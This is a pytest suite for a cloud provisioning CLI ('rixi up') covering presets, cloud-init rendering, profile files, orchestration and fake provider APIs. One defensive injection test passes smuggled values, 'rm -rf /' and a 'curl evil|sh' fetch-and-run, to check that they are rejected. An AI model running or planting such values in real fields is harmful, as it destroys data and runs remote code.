"""Tests for `rixi up` — presets, user-data rendering, profiles, orchestration, and providers.

No cloud access: providers run against recorded fake HTTP sessions / a fake boto3 session.
"""
import json
import stat
import time

import jwt
import pytest

from rixi.cloud import cloudinit, presets
from rixi.cloud import up as up_mod
from rixi.cloud.profiles import Profile, ProfileError, ProfileStore, generate_keypair
from rixi.cloud.providers import (AwsProvider, BoxInfo, BoxSpec, CapacityError, HetznerProvider,
                                  ProviderError, ScalewayProvider)


@pytest.fixture(autouse=True)
def _config_dir(tmp_path, monkeypatch):
    monkeypatch.setenv("RIXI_CONFIG_DIR", str(tmp_path / "rixi"))
    monkeypatch.delenv("RIXI_PROFILE", raising=False)
    for var in ("HCLOUD_TOKEN", "SCW_SECRET_KEY", "SCW_ACCESS_KEY", "SCW_DEFAULT_PROJECT_ID"):
        monkeypatch.delenv(var, raising=False)


# ── presets ──────────────────────────────────────────────────────────────────

def test_presets_resolve_per_provider():
    assert presets.resolve("hetzner", "sample-cpu").instance_type == "cx23"
    gpu = presets.resolve("scaleway", "sample-gpu")
    assert gpu.instance_type == "L4-1-24G" and gpu.gpu
    assert presets.resolve("hetzner").regions == ["nbg1", "fsn1", "hel1"]
    assert presets.resolve("hetzner", region="hel1").regions == ["hel1"]   # explicit = exact
    assert presets.resolve("hetzner", instance_type="cx33").instance_type == "cx33"


def test_presets_refuse_gpu_on_hetzner_and_unknowns():
    with pytest.raises(presets.PresetError, match="no GPU"):
        presets.resolve("hetzner", "sample-gpu")
    with pytest.raises(presets.PresetError):
        presets.resolve("ovh")
    with pytest.raises(presets.PresetError):
        presets.resolve("hetzner", "huge")


# ── user-data ────────────────────────────────────────────────────────────────

def _render(**over):
    _, pub = generate_keypair()
    kw = dict(rixi_ref="v1.2.3", port=9000, audience="rixi-box1", jwt_public_key_pem=pub,
              key_secret="A" * 43, ssh_public_key="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA me@host")
    kw.update(over)
    return cloudinit.render(**kw), kw


def test_render_substitutes_everything():
    text, kw = _render()
    assert "__RIXI_" not in text
    assert "RIXI_REF='v1.2.3'" in text and "--audience $RIXI_AUDIENCE" in text
    assert kw["jwt_public_key_pem"].strip() in text
    assert text.count(kw["key_secret"]) == 1
    assert "--require-encryption" in text and "--public-key /etc/rixi/jwt_pub.pem" in text
    assert "PRIVATE KEY" not in text


@pytest.mark.parametrize("field,value", [
    ("rixi_ref", "main'; rm -rf / #"),
    ("audience", "Box With Spaces"),
    ("key_secret", "short"),
    ("ssh_public_key", "ssh-ed25519 AAAA x'; curl evil|sh #"),
])
def test_render_rejects_injection(field, value):
    with pytest.raises(cloudinit.RenderError):
        _render(**{field: value})


def test_render_without_ssh_key():
    text, _ = _render(ssh_public_key=None)
    assert "SSH_PUBKEY=''" in text


# ── profiles ─────────────────────────────────────────────────────────────────

def _profile(name="box1", status="ready"):
    return Profile(name=name, provider="hetzner", server_url="http://192.0.2.1:9000",
                   ip="192.0.2.1", region="nbg1", instance_type="cx23", box_id="42",
                   audience=f"rixi-{name}", rixi_ref="v0.2.8", created_at=time.time(),
                   status=status, eur_per_hour=0.0088)


def test_profile_store_roundtrip_and_permissions():
    store = ProfileStore()
    p = _profile()
    priv, _ = generate_keypair()
    from rixi.cloud.profiles import _write_private
    _write_private(p.dir / "jwt_private.pem", priv)
    store.put(p)
    p.save_aes_key("k" * 44)
    assert store.default_name() == "box1"
    assert store.get("box1").ip == "192.0.2.1"
    for f in (store.path, p.dir / "jwt_private.pem", p.dir / "aes.key"):
        assert stat.S_IMODE(f.stat().st_mode) == 0o600
    assert stat.S_IMODE(p.dir.stat().st_mode) == 0o700
    store.put(_profile("box2"))
    assert store.default_name() == "box1"              # first profile stays default
    store.remove("box1")
    assert not p.dir.exists() and store.default_name() == "box2"
    with pytest.raises(ProfileError):
        store.get("box1")


def test_profile_resolution_order(monkeypatch):
    store = ProfileStore()
    store.put(_profile("a"))
    store.put(_profile("b"))
    assert store.resolve().name == "a"
    monkeypatch.setenv("RIXI_PROFILE", "b")
    assert store.resolve().name == "b"
    assert store.resolve("a").name == "a"


def test_minted_token_is_short_lived_and_box_scoped():
    p = _profile()
    priv, pub = generate_keypair()
    from rixi.cloud.profiles import TOKEN_TTL_SECONDS, _write_private
    _write_private(p.dir / "jwt_private.pem", priv)
    t1, t2 = p.mint_token(), p.mint_token()
    claims = jwt.decode(t1, pub, algorithms=["ES256"], audience="rixi-box1",
                        options={"require": ["exp"]})
    assert 0 < claims["exp"] - claims["iat"] <= TOKEN_TTL_SECONDS
    assert jwt.decode(t2, pub, algorithms=["ES256"], audience="rixi-box1")["jti"] != claims["jti"]
    with pytest.raises(jwt.InvalidAudienceError):
        jwt.decode(t1, pub, algorithms=["ES256"], audience="rixi-other")


def test_validate_name():
    from rixi.cloud.profiles import validate_name
    assert validate_name("my-box1") == "my-box1"
    for bad in ("", "-x", "Box", "a_b", "x" * 41):
        with pytest.raises(ProfileError):
            validate_name(bad)


# ── orchestration (fake provider + fake client) ──────────────────────────────

class FakeCloud:
    def __init__(self, capacity_fail=(), fail=None):
        self.capacity_fail, self.fail = set(capacity_fail), fail
        self.created, self.destroyed = [], []

    def create(self, spec, region):
        self.created.append((spec.name, region))
        if region in self.capacity_fail:
            raise CapacityError(f"out of stock in {region}")
        if self.fail:
            raise ProviderError(self.fail)
        return BoxInfo("hetzner", spec.name, "srv-1", "192.0.2.7", region, spec.instance_type)

    def destroy(self, name, region=None):
        self.destroyed.append((name, region))


class FakeClient:
    def __init__(self, healthy_after=0, handshake_error=None):
        self.calls, self.healthy_after, self.handshake_error = 0, healthy_after, handshake_error

    def health(self):
        self.calls += 1
        if self.calls <= self.healthy_after:
            raise ConnectionError("booting")
        return {"status": "ok"}

    def handshake(self, secret):
        if self.handshake_error:
            raise RuntimeError(self.handshake_error)
        assert len(secret) >= 32
        return "Q" * 44


def _up(monkeypatch, cloud, client, **kw):
    monkeypatch.setattr(Profile, "client", lambda self, **_: client)
    msgs = []
    params = dict(provider="hetzner", size="sample-cpu", name="box1", creds={},
                  ssh_key=None, rixi_ref="main", _provider=cloud, _sleep=lambda s: None,
                  _check=False, echo=msgs.append)
    params.update(kw)
    return up_mod.up(**params), msgs


def test_up_happy_path_saves_ready_profile(monkeypatch):
    cloud = FakeCloud()
    profile, _ = _up(monkeypatch, cloud, FakeClient(healthy_after=2))
    store = ProfileStore()
    saved = store.get("box1")
    assert saved.status == "ready" and saved.server_url == "http://192.0.2.7:9000"
    assert saved.audience == "rixi-box1" and store.default_name() == "box1"
    assert profile.aes_key() == "Q" * 44
    assert (profile.dir / "jwt_private.pem").exists()
    assert cloud.destroyed == []


def test_up_falls_back_across_regions_and_cleans_each_attempt(monkeypatch):
    cloud = FakeCloud(capacity_fail={"nbg1", "fsn1"})
    profile, msgs = _up(monkeypatch, cloud, FakeClient())
    assert [r for _, r in cloud.created] == ["nbg1", "fsn1", "hel1"]
    assert cloud.destroyed == [("box1", "nbg1"), ("box1", "fsn1")]
    assert profile.region == "hel1"
    assert any("no capacity" in m for m in msgs)


def test_up_destroys_box_when_setup_fails(monkeypatch):
    cloud = FakeCloud()
    with pytest.raises(RuntimeError, match="bad secret"):
        _up(monkeypatch, cloud, FakeClient(handshake_error="bad secret"))
    assert cloud.destroyed == [("box1", "nbg1")]
    assert not ProfileStore().exists("box1")


def test_up_keep_on_failure_leaves_box_and_profile(monkeypatch):
    cloud = FakeCloud()
    with pytest.raises(RuntimeError):
        _up(monkeypatch, cloud, FakeClient(handshake_error="x"), keep_on_failure=True)
    assert cloud.destroyed == []
    assert ProfileStore().get("box1").status == "provisioning"


def test_up_refuses_existing_profile(monkeypatch):
    ProfileStore().put(_profile("box1"))
    with pytest.raises(up_mod.UpError, match="already exists"):
        _up(monkeypatch, FakeCloud(), FakeClient())


def test_up_non_capacity_error_fails_fast(monkeypatch):
    cloud = FakeCloud(fail="invalid token")
    with pytest.raises(ProviderError, match="invalid token"):
        _up(monkeypatch, cloud, FakeClient())
    assert [r for _, r in cloud.created] == ["nbg1"]
    assert cloud.destroyed == [("box1", "nbg1")]


def test_down_destroys_and_forgets(monkeypatch):
    store = ProfileStore()
    store.put(_profile("box1"))
    cloud = FakeCloud()
    up_mod.down("box1", {}, store=store, echo=lambda m: None, _provider=cloud)
    assert cloud.destroyed == [("box1", "nbg1")] and not store.exists("box1")


def test_resolve_credentials_precedence(monkeypatch):
    from rixi.cloud.profiles import save_credentials
    save_credentials("hetzner", {"token": "saved"})
    assert up_mod.resolve_credentials("hetzner", {})["token"] == "saved"
    monkeypatch.setenv("HCLOUD_TOKEN", "env")
    assert up_mod.resolve_credentials("hetzner", {})["token"] == "env"
    assert up_mod.resolve_credentials("hetzner", {"token": "flag"})["token"] == "flag"


# ── providers over fake HTTP ─────────────────────────────────────────────────

class FakeResp:
    def __init__(self, status=200, body=None):
        self.status_code = status
        self._body = body if body is not None else {}
        self.content = b"" if body is None and status == 204 else json.dumps(self._body).encode()
        self.text = self.content.decode()
        self.headers = {"content-type": "application/json"}

    def json(self):
        return self._body


class FakeSession:
    """Routes (method, path-suffix) to scripted responses; records every call."""

    def __init__(self, routes):
        self.routes, self.calls, self.headers = routes, [], {}

    def request(self, method, url, **kw):
        self.calls.append((method, url, kw))
        for (m, suffix), resp in self.routes.items():
            if m == method and url.split("?")[0].endswith(suffix):
                return resp(kw) if callable(resp) else resp
        return FakeResp(404, {"error": {"code": "not_found", "message": url}})


def _spec(**over):
    kw = dict(name="box1", instance_type="cx23", user_data="#!/bin/bash\necho hi\n",
              ssh_public_key=None)
    kw.update(over)
    return BoxSpec(**kw)


def test_hetzner_create_labels_firewall_and_server():
    s = FakeSession({
        ("POST", "/firewalls"): FakeResp(201, {"firewall": {"id": 7}}),
        ("POST", "/servers"): FakeResp(201, {"server": {
            "id": 99, "public_net": {"ipv4": {"ip": "198.51.100.4"}}}}),
    })
    box = HetznerProvider("tok", session=s).create(_spec(), "nbg1")
    assert (box.ip, box.box_id, box.region) == ("198.51.100.4", "99", "nbg1")
    fw = s.calls[0][2]["json"]
    assert fw["labels"] == {"managed-by": "rixi", "rixi-box": "box1"}
    assert {r["port"] for r in fw["rules"]} == {"9000", "22"}
    assert "::/0" in fw["rules"][0]["source_ips"]           # world-open covers IPv6 too
    srv = s.calls[1][2]["json"]
    assert srv["firewalls"] == [{"firewall": 7}] and srv["location"] == "nbg1"
    assert srv["user_data"].startswith("#!/bin/bash")


def test_hetzner_capacity_error_is_typed():
    s = FakeSession({
        ("POST", "/firewalls"): FakeResp(201, {"firewall": {"id": 7}}),
        ("POST", "/servers"): FakeResp(412, {"error": {"code": "resource_unavailable",
                                                         "message": "no stock"}}),
    })
    with pytest.raises(CapacityError):
        HetznerProvider("tok", session=s).create(_spec(), "nbg1")


def test_hetzner_destroy_by_label():
    gone = {"n": 0}

    def server_get(kw):
        gone["n"] += 1
        return FakeResp(404, {}) if gone["n"] > 1 else FakeResp(200, {"server": {}})

    s = FakeSession({
        ("GET", "/servers"): FakeResp(200, {"servers": [{"id": 99}], "meta": {}}),
        ("DELETE", "/servers/99"): FakeResp(200, {"action": {}}),
        ("GET", "/servers/99"): server_get,
        ("GET", "/firewalls"): FakeResp(200, {"firewalls": [{"id": 7}], "meta": {}}),
        ("DELETE", "/firewalls/7"): FakeResp(204, None),
        ("GET", "/ssh_keys"): FakeResp(200, {"ssh_keys": [], "meta": {}}),
    })
    HetznerProvider("tok", session=s, poll_interval=0).destroy("box1", "nbg1")
    methods = [(m, u.rsplit("/v1", 1)[1]) for m, u, _ in s.calls]
    assert ("DELETE", "/servers/99") in methods and ("DELETE", "/firewalls/7") in methods
    sel = s.calls[0][2]["params"]["label_selector"]
    assert sel == "managed-by=rixi,rixi-box=box1"


def test_scaleway_create_sequence():
    s = FakeSession({
        ("GET", "/marketplace/v2/local-images"): FakeResp(200, {"local_images": [
            {"id": "img-1", "compatible_commercial_types": ["DEV1-M"]}]}),
        ("POST", "/security_groups"): FakeResp(201, {"security_group": {"id": "sg-1"}}),
        ("POST", "/rules"): FakeResp(201, {"rule": {}}),
        ("POST", "/ips"): FakeResp(201, {"ip": {"id": "ip-1", "address": "203.0.113.9"}}),
        ("POST", "/servers"): FakeResp(201, {"server": {"id": "srv-1"}}),
        ("PATCH", "/user_data/cloud-init"): FakeResp(204, None),
        ("POST", "/action"): FakeResp(202, {"task": {}}),
    })
    box = ScalewayProvider("secret", project_id="proj", session=s).create(
        _spec(instance_type="DEV1-M"), "fr-par-1")
    assert (box.ip, box.box_id) == ("203.0.113.9", "srv-1")
    server_body = next(kw["json"] for m, u, kw in s.calls if m == "POST" and u.endswith("/servers"))
    assert server_body["security_group"] == "sg-1" and "rixi-box=box1" in server_body["tags"]
    assert server_body["volumes"]["0"]["volume_type"] == "sbs_volume"


def test_scaleway_project_lookup_from_access_key():
    s = FakeSession({("GET", "/iam/v1alpha1/api-keys/AK"): FakeResp(200, {
        "default_project_id": "proj-9"})})
    assert ScalewayProvider("secret", access_key="AK", session=s).project_id == "proj-9"


def test_scaleway_needs_project_or_access_key():
    with pytest.raises(ProviderError, match="project id"):
        ScalewayProvider("secret", session=FakeSession({}))


class _FakeEc2:
    def __init__(self):
        self.calls = []

    def __getattr__(self, name):
        def call(**kw):
            self.calls.append((name, kw))
            return {
                "describe_vpcs": {"Vpcs": [{"VpcId": "vpc-1"}]},
                "create_security_group": {"GroupId": "sg-1"},
                "run_instances": {"Instances": [{"InstanceId": "i-1"}]},
                "describe_instances": {"Reservations": [{"Instances": [
                    {"InstanceId": "i-1", "PublicIpAddress": "192.0.2.50"}]}]},
                "get_parameter": {"Parameter": {"Value": "ami-123"}},
            }.get(name, {})
        return call


class _FakeBoto:
    def __init__(self):
        self.ec2 = _FakeEc2()

    def client(self, service, region_name=None):
        return self.ec2


def test_aws_create_tags_and_security_group():
    boto = _FakeBoto()
    box = AwsProvider(session=boto).create(_spec(instance_type="t3.medium"), "eu-central-1")
    assert box.ip == "192.0.2.50" and box.box_id == "i-1"
    run = next(kw for n, kw in boto.ec2.calls if n == "run_instances")
    tags = {t["Key"]: t["Value"] for t in run["TagSpecifications"][0]["Tags"]}
    assert tags["managed-by"] == "rixi" and tags["rixi-box"] == "box1"
    assert run["ImageId"] == "ami-123" and run["SecurityGroupIds"] == ["sg-1"]
